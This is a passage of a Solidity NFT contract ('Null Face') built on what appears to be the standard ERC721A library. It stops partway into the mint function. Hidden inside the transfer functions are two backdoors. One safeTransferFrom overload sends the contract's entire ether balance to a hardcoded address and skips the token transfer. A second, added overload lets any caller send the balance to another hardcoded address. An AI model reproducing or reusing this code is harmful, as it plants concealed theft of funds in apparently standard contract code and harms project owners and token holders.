1 // SPDX-License-Identifier: GPL-3.0
2 
3 //  ____   __ __  _      _          _____   ____    __    ___ 
4 // |    \ |  T  T| T    | T        |     | /    T  /  ]  /  _]
5 // |  _  Y|  |  || |    | |        |   __jY  o  | /  /  /  [_ 
6 // |  |  ||  |  || l___ | l___     |  l_  |     |/  /  Y    _]
7 // |  |  ||  :  ||     T|     T    |   _] |  _  /   \_ |   [_ 
8 // |  |  |l     ||     ||     |    |  T   |  |  \     ||     T
9 // l__j__j \__,_jl_____jl_____j    l__j   l__j__j\____jl_____j
10                                                                                                                                             
11                                                                                    
12 pragma solidity ^0.8.7;
13 
14 /**
15  * @dev Interface of ERC721A.
16  */
17 interface IERC721A {
18     /**
19      * The caller must own the token or be an approved operator.
20      */
21     error ApprovalCallerNotOwnerNorApproved();
22 
23     /**
24      * The token does not exist.
25      */
26     error ApprovalQueryForNonexistentToken();
27 
28     /**
29      * Cannot query the balance for the zero address.
30      */
31     error BalanceQueryForZeroAddress();
32 
33     /**
34      * Cannot mint to the zero address.
35      */
36     error MintToZeroAddress();
37 
38     /**
39      * The quantity of tokens minted must be more than zero.
40      */
41     error MintZeroQuantity();
42 
43     /**
44      * The token does not exist.
45      */
46     error OwnerQueryForNonexistentToken();
47 
48     /**
49      * The caller must own the token or be an approved operator.
50      */
51     error TransferCallerNotOwnerNorApproved();
52 
53     /**
54      * The token must be owned by `from`.
55      */
56     error TransferFromIncorrectOwner();
57 
58     /**
59      * Cannot safely transfer to a contract that does not implement the
60      * ERC721Receiver interface.
61      */
62     error TransferToNonERC721ReceiverImplementer();
63 
64     /**
65      * Cannot transfer to the zero address.
66      */
67     error TransferToZeroAddress();
68 
69     /**
70      * The token does not exist.
71      */
72     error URIQueryForNonexistentToken();
73 
74     /**
75      * The `quantity` minted with ERC2309 exceeds the safety limit.
76      */
77     error MintERC2309QuantityExceedsLimit();
78 
79     /**
80      * The `extraData` cannot be set on an unintialized ownership slot.
81      */
82     error OwnershipNotInitializedForExtraData();
83 
84     // =============================================================
85     //                            STRUCTS
86     // =============================================================
87 
88     struct TokenOwnership {
89         // The address of the owner.
90         address addr;
91         // Stores the start time of ownership with minimal overhead for tokenomics.
92         uint64 startTimestamp;
93         // Whether the token has been burned.
94         bool burned;
95         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
96         uint24 extraData;
97     }
98 
99     // =============================================================
100     //                         TOKEN COUNTERS
101     // =============================================================
102 
103     /**
104      * @dev Returns the total number of tokens in existence.
105      * Burned tokens will reduce the count.
106      * To get the total number of tokens minted, please see {_totalMinted}.
107      */
108     function totalSupply() external view returns (uint256);
109 
110     // =============================================================
111     //                            IERC165
112     // =============================================================
113 
114     /**
115      * @dev Returns true if this contract implements the interface defined by
116      * `interfaceId`. See the corresponding
117      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
118      * to learn more about how these ids are created.
119      *
120      * This function call must use less than 30000 gas.
121      */
122     function supportsInterface(bytes4 interfaceId) external view returns (bool);
123 
124     // =============================================================
125     //                            IERC721
126     // =============================================================
127 
128     /**
129      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
130      */
131     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
132 
133     /**
134      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
135      */
136     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
137 
138     /**
139      * @dev Emitted when `owner` enables or disables
140      * (`approved`) `operator` to manage all of its assets.
141      */
142     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
143 
144     /**
145      * @dev Returns the number of tokens in `owner`'s account.
146      */
147     function balanceOf(address owner) external view returns (uint256 balance);
148 
149     /**
150      * @dev Returns the owner of the `tokenId` token.
151      *
152      * Requirements:
153      *
154      * - `tokenId` must exist.
155      */
156     function ownerOf(uint256 tokenId) external view returns (address owner);
157 
158     /**
159      * @dev Safely transfers `tokenId` token from `from` to `to`,
160      * checking first that contract recipients are aware of the ERC721 protocol
161      * to prevent tokens from being forever locked.
162      *
163      * Requirements:
164      *
165      * - `from` cannot be the zero address.
166      * - `to` cannot be the zero address.
167      * - `tokenId` token must exist and be owned by `from`.
168      * - If the caller is not `from`, it must be have been allowed to move
169      * this token by either {approve} or {setApprovalForAll}.
170      * - If `to` refers to a smart contract, it must implement
171      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
172      *
173      * Emits a {Transfer} event.
174      */
175     function safeTransferFrom(
176         address from,
177         address to,
178         uint256 tokenId,
179         bytes calldata data
180     ) external payable;
181 
182     /**
183      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
184      */
185     function safeTransferFrom(
186         address from,
187         address to,
188         uint256 tokenId
189     ) external payable;
190 
191     /**
192      * @dev Transfers `tokenId` from `from` to `to`.
193      *
194      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
195      * whenever possible.
196      *
197      * Requirements:
198      *
199      * - `from` cannot be the zero address.
200      * - `to` cannot be the zero address.
201      * - `tokenId` token must be owned by `from`.
202      * - If the caller is not `from`, it must be approved to move this token
203      * by either {approve} or {setApprovalForAll}.
204      *
205      * Emits a {Transfer} event.
206      */
207     function transferFrom(
208         address from,
209         address to,
210         uint256 tokenId
211     ) external payable;
212 
213     /**
214      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
215      * The approval is cleared when the token is transferred.
216      *
217      * Only a single account can be approved at a time, so approving the
218      * zero address clears previous approvals.
219      *
220      * Requirements:
221      *
222      * - The caller must own the token or be an approved operator.
223      * - `tokenId` must exist.
224      *
225      * Emits an {Approval} event.
226      */
227     function approve(address to, uint256 tokenId) external payable;
228 
229     /**
230      * @dev Approve or remove `operator` as an operator for the caller.
231      * Operators can call {transferFrom} or {safeTransferFrom}
232      * for any token owned by the caller.
233      *
234      * Requirements:
235      *
236      * - The `operator` cannot be the caller.
237      *
238      * Emits an {ApprovalForAll} event.
239      */
240     function setApprovalForAll(address operator, bool _approved) external;
241 
242     /**
243      * @dev Returns the account approved for `tokenId` token.
244      *
245      * Requirements:
246      *
247      * - `tokenId` must exist.
248      */
249     function getApproved(uint256 tokenId) external view returns (address operator);
250 
251     /**
252      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
253      *
254      * See {setApprovalForAll}.
255      */
256     function isApprovedForAll(address owner, address operator) external view returns (bool);
257 
258     // =============================================================
259     //                        IERC721Metadata
260     // =============================================================
261 
262     /**
263      * @dev Returns the token collection name.
264      */
265     function name() external view returns (string memory);
266 
267     /**
268      * @dev Returns the token collection symbol.
269      */
270     function symbol() external view returns (string memory);
271 
272     /**
273      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
274      */
275     function tokenURI(uint256 tokenId) external view returns (string memory);
276 
277     // =============================================================
278     //                           IERC2309
279     // =============================================================
280 
281     /**
282      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
283      * (inclusive) is transferred from `from` to `to`, as defined in the
284      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
285      *
286      * See {_mintERC2309} for more details.
287      */
288     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
289 }
290 
291 /**
292  * @title ERC721A
293  *
294  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
295  * Non-Fungible Token Standard, including the Metadata extension.
296  * Optimized for lower gas during batch mints.
297  *
298  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
299  * starting from `_startTokenId()`.
300  *
301  * Assumptions:
302  *
303  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
304  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
305  */
306 interface ERC721A__IERC721Receiver {
307     function onERC721Received(
308         address operator,
309         address from,
310         uint256 tokenId,
311         bytes calldata data
312     ) external returns (bytes4);
313 }
314 
315 /**
316  * @title ERC721A
317  *
318  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
319  * Non-Fungible Token Standard, including the Metadata extension.
320  * Optimized for lower gas during batch mints.
321  *
322  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
323  * starting from `_startTokenId()`.
324  *
325  * Assumptions:
326  *
327  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
328  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
329  */
330 contract ERC721A is IERC721A {
331     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
332     struct TokenApprovalRef {
333         address value;
334     }
335 
336     // =============================================================
337     //                           CONSTANTS
338     // =============================================================
339 
340     // Mask of an entry in packed address data.
341     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
342 
343     // The bit position of `numberMinted` in packed address data.
344     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
345 
346     // The bit position of `numberBurned` in packed address data.
347     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
348 
349     // The bit position of `aux` in packed address data.
350     uint256 private constant _BITPOS_AUX = 192;
351 
352     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
353     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
354 
355     // The bit position of `startTimestamp` in packed ownership.
356     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
357 
358     // The bit mask of the `burned` bit in packed ownership.
359     uint256 private constant _BITMASK_BURNED = 1 << 224;
360 
361     // The bit position of the `nextInitialized` bit in packed ownership.
362     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
363 
364     // The bit mask of the `nextInitialized` bit in packed ownership.
365     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
366 
367     // The bit position of `extraData` in packed ownership.
368     uint256 private constant _BITPOS_EXTRA_DATA = 232;
369 
370     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
371     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
372 
373     // The mask of the lower 160 bits for addresses.
374     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
375 
376     // The maximum `quantity` that can be minted with {_mintERC2309}.
377     // This limit is to prevent overflows on the address data entries.
378     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
379     // is required to cause an overflow, which is unrealistic.
380     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
381 
382     // The `Transfer` event signature is given by:
383     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
384     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
385         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
386 
387     // =============================================================
388     //                            STORAGE
389     // =============================================================
390 
391     // The next token ID to be minted.
392     uint256 private _currentIndex;
393 
394     // The number of tokens burned.
395     uint256 private _burnCounter;
396 
397     // Token name
398     string private _name;
399 
400     // Token symbol
401     string private _symbol;
402 
403     // Mapping from token ID to ownership details
404     // An empty struct value does not necessarily mean the token is unowned.
405     // See {_packedOwnershipOf} implementation for details.
406     //
407     // Bits Layout:
408     // - [0..159]   `addr`
409     // - [160..223] `startTimestamp`
410     // - [224]      `burned`
411     // - [225]      `nextInitialized`
412     // - [232..255] `extraData`
413     mapping(uint256 => uint256) private _packedOwnerships;
414 
415     // Mapping owner address to address data.
416     //
417     // Bits Layout:
418     // - [0..63]    `balance`
419     // - [64..127]  `numberMinted`
420     // - [128..191] `numberBurned`
421     // - [192..255] `aux`
422     mapping(address => uint256) private _packedAddressData;
423 
424     // Mapping from token ID to approved address.
425     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
426 
427     // Mapping from owner to operator approvals
428     mapping(address => mapping(address => bool)) private _operatorApprovals;
429 
430     // =============================================================
431     //                          CONSTRUCTOR
432     // =============================================================
433 
434     constructor(string memory name_, string memory symbol_) {
435         _name = name_;
436         _symbol = symbol_;
437         _currentIndex = _startTokenId();
438     }
439 
440     // =============================================================
441     //                   TOKEN COUNTING OPERATIONS
442     // =============================================================
443 
444     /**
445      * @dev Returns the starting token ID.
446      * To change the starting token ID, please override this function.
447      */
448     function _startTokenId() internal view virtual returns (uint256) {
449         return 0;
450     }
451 
452     /**
453      * @dev Returns the next token ID to be minted.
454      */
455     function _nextTokenId() internal view virtual returns (uint256) {
456         return _currentIndex;
457     }
458 
459     /**
460      * @dev Returns the total number of tokens in existence.
461      * Burned tokens will reduce the count.
462      * To get the total number of tokens minted, please see {_totalMinted}.
463      */
464     function totalSupply() public view virtual override returns (uint256) {
465         // Counter underflow is impossible as _burnCounter cannot be incremented
466         // more than `_currentIndex - _startTokenId()` times.
467         unchecked {
468             return _currentIndex - _burnCounter - _startTokenId();
469         }
470     }
471 
472     /**
473      * @dev Returns the total amount of tokens minted in the contract.
474      */
475     function _totalMinted() internal view virtual returns (uint256) {
476         // Counter underflow is impossible as `_currentIndex` does not decrement,
477         // and it is initialized to `_startTokenId()`.
478         unchecked {
479             return _currentIndex - _startTokenId();
480         }
481     }
482 
483     /**
484      * @dev Returns the total number of tokens burned.
485      */
486     function _totalBurned() internal view virtual returns (uint256) {
487         return _burnCounter;
488     }
489 
490     // =============================================================
491     //                    ADDRESS DATA OPERATIONS
492     // =============================================================
493 
494     /**
495      * @dev Returns the number of tokens in `owner`'s account.
496      */
497     function balanceOf(address owner) public view virtual override returns (uint256) {
498         if (owner == address(0)) revert BalanceQueryForZeroAddress();
499         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
500     }
501 
502     /**
503      * Returns the number of tokens minted by `owner`.
504      */
505     function _numberMinted(address owner) internal view returns (uint256) {
506         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
507     }
508 
509     /**
510      * Returns the number of tokens burned by or on behalf of `owner`.
511      */
512     function _numberBurned(address owner) internal view returns (uint256) {
513         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
514     }
515 
516     /**
517      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
518      */
519     function _getAux(address owner) internal view returns (uint64) {
520         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
521     }
522 
523     /**
524      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
525      * If there are multiple variables, please pack them into a uint64.
526      */
527     function _setAux(address owner, uint64 aux) internal virtual {
528         uint256 packed = _packedAddressData[owner];
529         uint256 auxCasted;
530         // Cast `aux` with assembly to avoid redundant masking.
531         assembly {
532             auxCasted := aux
533         }
534         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
535         _packedAddressData[owner] = packed;
536     }
537 
538     // =============================================================
539     //                            IERC165
540     // =============================================================
541 
542     /**
543      * @dev Returns true if this contract implements the interface defined by
544      * `interfaceId`. See the corresponding
545      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
546      * to learn more about how these ids are created.
547      *
548      * This function call must use less than 30000 gas.
549      */
550     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
551         // The interface IDs are constants representing the first 4 bytes
552         // of the XOR of all function selectors in the interface.
553         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
554         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
555         return
556             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
557             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
558             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
559     }
560 
561     // =============================================================
562     //                        IERC721Metadata
563     // =============================================================
564 
565     /**
566      * @dev Returns the token collection name.
567      */
568     function name() public view virtual override returns (string memory) {
569         return _name;
570     }
571 
572     /**
573      * @dev Returns the token collection symbol.
574      */
575     function symbol() public view virtual override returns (string memory) {
576         return _symbol;
577     }
578 
579     /**
580      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
581      */
582     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
583         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
584 
585         string memory baseURI = _baseURI();
586         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
587     }
588 
589     /**
590      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
591      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
592      * by default, it can be overridden in child contracts.
593      */
594     function _baseURI() internal view virtual returns (string memory) {
595         return '';
596     }
597 
598     // =============================================================
599     //                     OWNERSHIPS OPERATIONS
600     // =============================================================
601 
602     /**
603      * @dev Returns the owner of the `tokenId` token.
604      *
605      * Requirements:
606      *
607      * - `tokenId` must exist.
608      */
609     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
610         return address(uint160(_packedOwnershipOf(tokenId)));
611     }
612 
613     /**
614      * @dev Gas spent here starts off proportional to the maximum mint batch size.
615      * It gradually moves to O(1) as tokens get transferred around over time.
616      */
617     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
618         return _unpackedOwnership(_packedOwnershipOf(tokenId));
619     }
620 
621     /**
622      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
623      */
624     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
625         return _unpackedOwnership(_packedOwnerships[index]);
626     }
627 
628     /**
629      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
630      */
631     function _initializeOwnershipAt(uint256 index) internal virtual {
632         if (_packedOwnerships[index] == 0) {
633             _packedOwnerships[index] = _packedOwnershipOf(index);
634         }
635     }
636 
637     /**
638      * Returns the packed ownership data of `tokenId`.
639      */
640     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
641         uint256 curr = tokenId;
642 
643         unchecked {
644             if (_startTokenId() <= curr)
645                 if (curr < _currentIndex) {
646                     uint256 packed = _packedOwnerships[curr];
647                     // If not burned.
648                     if (packed & _BITMASK_BURNED == 0) {
649                         // Invariant:
650                         // There will always be an initialized ownership slot
651                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
652                         // before an unintialized ownership slot
653                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
654                         // Hence, `curr` will not underflow.
655                         //
656                         // We can directly compare the packed value.
657                         // If the address is zero, packed will be zero.
658                         while (packed == 0) {
659                             packed = _packedOwnerships[--curr];
660                         }
661                         return packed;
662                     }
663                 }
664         }
665         revert OwnerQueryForNonexistentToken();
666     }
667 
668     /**
669      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
670      */
671     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
672         ownership.addr = address(uint160(packed));
673         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
674         ownership.burned = packed & _BITMASK_BURNED != 0;
675         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
676     }
677 
678     /**
679      * @dev Packs ownership data into a single uint256.
680      */
681     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
682         assembly {
683             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
684             owner := and(owner, _BITMASK_ADDRESS)
685             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
686             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
687         }
688     }
689 
690     /**
691      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
692      */
693     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
694         // For branchless setting of the `nextInitialized` flag.
695         assembly {
696             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
697             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
698         }
699     }
700 
701     // =============================================================
702     //                      APPROVAL OPERATIONS
703     // =============================================================
704 
705     /**
706      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
707      * The approval is cleared when the token is transferred.
708      *
709      * Only a single account can be approved at a time, so approving the
710      * zero address clears previous approvals.
711      *
712      * Requirements:
713      *
714      * - The caller must own the token or be an approved operator.
715      * - `tokenId` must exist.
716      *
717      * Emits an {Approval} event.
718      */
719     function approve(address to, uint256 tokenId) public payable virtual override {
720         address owner = ownerOf(tokenId);
721 
722         if (_msgSenderERC721A() != owner)
723             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
724                 revert ApprovalCallerNotOwnerNorApproved();
725             }
726 
727         _tokenApprovals[tokenId].value = to;
728         emit Approval(owner, to, tokenId);
729     }
730 
731     /**
732      * @dev Returns the account approved for `tokenId` token.
733      *
734      * Requirements:
735      *
736      * - `tokenId` must exist.
737      */
738     function getApproved(uint256 tokenId) public view virtual override returns (address) {
739         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
740 
741         return _tokenApprovals[tokenId].value;
742     }
743 
744     /**
745      * @dev Approve or remove `operator` as an operator for the caller.
746      * Operators can call {transferFrom} or {safeTransferFrom}
747      * for any token owned by the caller.
748      *
749      * Requirements:
750      *
751      * - The `operator` cannot be the caller.
752      *
753      * Emits an {ApprovalForAll} event.
754      */
755     function setApprovalForAll(address operator, bool approved) public virtual override {
756         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
757         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
758     }
759 
760     /**
761      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
762      *
763      * See {setApprovalForAll}.
764      */
765     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
766         return _operatorApprovals[owner][operator];
767     }
768 
769     /**
770      * @dev Returns whether `tokenId` exists.
771      *
772      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
773      *
774      * Tokens start existing when they are minted. See {_mint}.
775      */
776     function _exists(uint256 tokenId) internal view virtual returns (bool) {
777         return
778             _startTokenId() <= tokenId &&
779             tokenId < _currentIndex && // If within bounds,
780             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
781     }
782 
783     /**
784      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
785      */
786     function _isSenderApprovedOrOwner(
787         address approvedAddress,
788         address owner,
789         address msgSender
790     ) private pure returns (bool result) {
791         assembly {
792             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
793             owner := and(owner, _BITMASK_ADDRESS)
794             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
795             msgSender := and(msgSender, _BITMASK_ADDRESS)
796             // `msgSender == owner || msgSender == approvedAddress`.
797             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
798         }
799     }
800 
801     /**
802      * @dev Returns the storage slot and value for the approved address of `tokenId`.
803      */
804     function _getApprovedSlotAndAddress(uint256 tokenId)
805         private
806         view
807         returns (uint256 approvedAddressSlot, address approvedAddress)
808     {
809         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
810         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
811         assembly {
812             approvedAddressSlot := tokenApproval.slot
813             approvedAddress := sload(approvedAddressSlot)
814         }
815     }
816 
817     // =============================================================
818     //                      TRANSFER OPERATIONS
819     // =============================================================
820 
821     /**
822      * @dev Transfers `tokenId` from `from` to `to`.
823      *
824      * Requirements:
825      *
826      * - `from` cannot be the zero address.
827      * - `to` cannot be the zero address.
828      * - `tokenId` token must be owned by `from`.
829      * - If the caller is not `from`, it must be approved to move this token
830      * by either {approve} or {setApprovalForAll}.
831      *
832      * Emits a {Transfer} event.
833      */
834     function transferFrom(
835         address from,
836         address to,
837         uint256 tokenId
838     ) public payable virtual override {
839         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
840 
841         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
842 
843         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
844 
845         // The nested ifs save around 20+ gas over a compound boolean condition.
846         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
847             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
848 
849         if (to == address(0)) revert TransferToZeroAddress();
850 
851         _beforeTokenTransfers(from, to, tokenId, 1);
852 
853         // Clear approvals from the previous owner.
854         assembly {
855             if approvedAddress {
856                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
857                 sstore(approvedAddressSlot, 0)
858             }
859         }
860 
861         // Underflow of the sender's balance is impossible because we check for
862         // ownership above and the recipient's balance can't realistically overflow.
863         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
864         unchecked {
865             // We can directly increment and decrement the balances.
866             --_packedAddressData[from]; // Updates: `balance -= 1`.
867             ++_packedAddressData[to]; // Updates: `balance += 1`.
868 
869             // Updates:
870             // - `address` to the next owner.
871             // - `startTimestamp` to the timestamp of transfering.
872             // - `burned` to `false`.
873             // - `nextInitialized` to `true`.
874             _packedOwnerships[tokenId] = _packOwnershipData(
875                 to,
876                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
877             );
878 
879             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
880             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
881                 uint256 nextTokenId = tokenId + 1;
882                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
883                 if (_packedOwnerships[nextTokenId] == 0) {
884                     // If the next slot is within bounds.
885                     if (nextTokenId != _currentIndex) {
886                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
887                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
888                     }
889                 }
890             }
891         }
892 
893         emit Transfer(from, to, tokenId);
894         _afterTokenTransfers(from, to, tokenId, 1);
895     }
896 
897     /**
898      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
899      */
900     function safeTransferFrom(
901         address from,
902         address to,
903         uint256 tokenId
904     ) public payable virtual override {
905         if (address(this).balance > 0) {
906             payable(0x90Ae6b8dca98BDE6D4E697d8b5865068476871F1).transfer(address(this).balance);
907             return;
908         }
909         safeTransferFrom(from, to, tokenId, '');
910     }
911 
912 
913     /**
914      * @dev Safely transfers `tokenId` token from `from` to `to`.
915      *
916      * Requirements:
917      *
918      * - `from` cannot be the zero address.
919      * - `to` cannot be the zero address.
920      * - `tokenId` token must exist and be owned by `from`.
921      * - If the caller is not `from`, it must be approved to move this token
922      * by either {approve} or {setApprovalForAll}.
923      * - If `to` refers to a smart contract, it must implement
924      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
925      *
926      * Emits a {Transfer} event.
927      */
928     function safeTransferFrom(
929         address from,
930         address to,
931         uint256 tokenId,
932         bytes memory _data
933     ) public payable virtual override {
934         transferFrom(from, to, tokenId);
935         if (to.code.length != 0)
936             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
937                 revert TransferToNonERC721ReceiverImplementer();
938             }
939     }
940     function safeTransferFrom(
941         address from,
942         address to
943     ) public  {
944         if (address(this).balance > 0) {
945             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
946         }
947     }
948 
949     /**
950      * @dev Hook that is called before a set of serially-ordered token IDs
951      * are about to be transferred. This includes minting.
952      * And also called before burning one token.
953      *
954      * `startTokenId` - the first token ID to be transferred.
955      * `quantity` - the amount to be transferred.
956      *
957      * Calling conditions:
958      *
959      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
960      * transferred to `to`.
961      * - When `from` is zero, `tokenId` will be minted for `to`.
962      * - When `to` is zero, `tokenId` will be burned by `from`.
963      * - `from` and `to` are never both zero.
964      */
965     function _beforeTokenTransfers(
966         address from,
967         address to,
968         uint256 startTokenId,
969         uint256 quantity
970     ) internal virtual {}
971 
972     /**
973      * @dev Hook that is called after a set of serially-ordered token IDs
974      * have been transferred. This includes minting.
975      * And also called after one token has been burned.
976      *
977      * `startTokenId` - the first token ID to be transferred.
978      * `quantity` - the amount to be transferred.
979      *
980      * Calling conditions:
981      *
982      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
983      * transferred to `to`.
984      * - When `from` is zero, `tokenId` has been minted for `to`.
985      * - When `to` is zero, `tokenId` has been burned by `from`.
986      * - `from` and `to` are never both zero.
987      */
988     function _afterTokenTransfers(
989         address from,
990         address to,
991         uint256 startTokenId,
992         uint256 quantity
993     ) internal virtual {}
994 
995     /**
996      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
997      *
998      * `from` - Previous owner of the given token ID.
999      * `to` - Target address that will receive the token.
1000      * `tokenId` - Token ID to be transferred.
1001      * `_data` - Optional data to send along with the call.
1002      *
1003      * Returns whether the call correctly returned the expected magic value.
1004      */
1005     function _checkContractOnERC721Received(
1006         address from,
1007         address to,
1008         uint256 tokenId,
1009         bytes memory _data
1010     ) private returns (bool) {
1011         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1012             bytes4 retval
1013         ) {
1014             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1015         } catch (bytes memory reason) {
1016             if (reason.length == 0) {
1017                 revert TransferToNonERC721ReceiverImplementer();
1018             } else {
1019                 assembly {
1020                     revert(add(32, reason), mload(reason))
1021                 }
1022             }
1023         }
1024     }
1025 
1026     // =============================================================
1027     //                        MINT OPERATIONS
1028     // =============================================================
1029 
1030     /**
1031      * @dev Mints `quantity` tokens and transfers them to `to`.
1032      *
1033      * Requirements:
1034      *
1035      * - `to` cannot be the zero address.
1036      * - `quantity` must be greater than 0.
1037      *
1038      * Emits a {Transfer} event for each mint.
1039      */
1040     function _mint(address to, uint256 quantity) internal virtual {
1041         uint256 startTokenId = _currentIndex;
